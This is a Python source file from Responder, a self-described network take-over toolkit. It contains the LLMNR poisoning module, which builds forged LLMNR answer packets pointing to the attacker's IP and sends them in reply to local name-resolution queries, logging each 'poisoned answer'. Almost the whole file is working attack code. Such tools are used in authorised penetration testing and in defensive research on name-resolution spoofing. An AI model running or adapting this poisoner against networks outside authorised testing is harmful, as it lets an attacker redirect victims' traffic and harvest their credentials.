#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from SocketServer import BaseRequestHandler
from odict import OrderedDict
from utils import *

# Packet class handling all packet generation (see odict.py).
class Packet():
	fields = OrderedDict([
		("data", ""),
	])
	def __init__(self, **kw):
		self.fields = OrderedDict(self.__class__.fields)
		for k,v in kw.items():
			if callable(v):
				self.fields[k] = v(self.fields[k])
			else:
				self.fields[k] = v
	def __str__(self):
		return "".join(map(str, self.fields.values()))

# LLMNR Answer Packet
class LLMNR_Ans(Packet):
	fields = OrderedDict([
		("Tid",              ""),
		("Flags",            "\x80\x00"),
		("Question",         "\x00\x01"),
		("AnswerRRS",        "\x00\x01"),
		("AuthorityRRS",     "\x00\x00"),
		("AdditionalRRS",    "\x00\x00"),
		("QuestionNameLen",  "\x09"),
		("QuestionName",     ""),
		("QuestionNameNull", "\x00"),
		("Type",             "\x00\x01"),
		("Class",            "\x00\x01"),
		("AnswerNameLen",    "\x09"),
		("AnswerName",       ""),
		("AnswerNameNull",   "\x00"),
		("Type1",            "\x00\x01"),
		("Class1",           "\x00\x01"),
		("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
		("IPLen",            "\x00\x04"),
		("IP",               "\x00\x00\x00\x00"),
	])

	def calculate(self):
		self.fields["IP"] = RespondWithIPAton()
		self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))
		self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
		self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]



def Parse_LLMNR_Name(data):
	NameLen = struct.unpack('>B',data[12])[0]
	return data[13:13+NameLen]


class LLMNR(BaseRequestHandler):  # LLMNR Server class
	def handle(self):
		data, soc = self.request
		Name = Parse_LLMNR_Name(data)

		if data[2:4] == "\x00\x00" and Parse_IPV6_Addr(data):
			Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
			Buffer.calculate()
			soc.sendto(str(Buffer), self.client_address)
			LineHeader = "[*] [LLMNR]"
			print color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1)

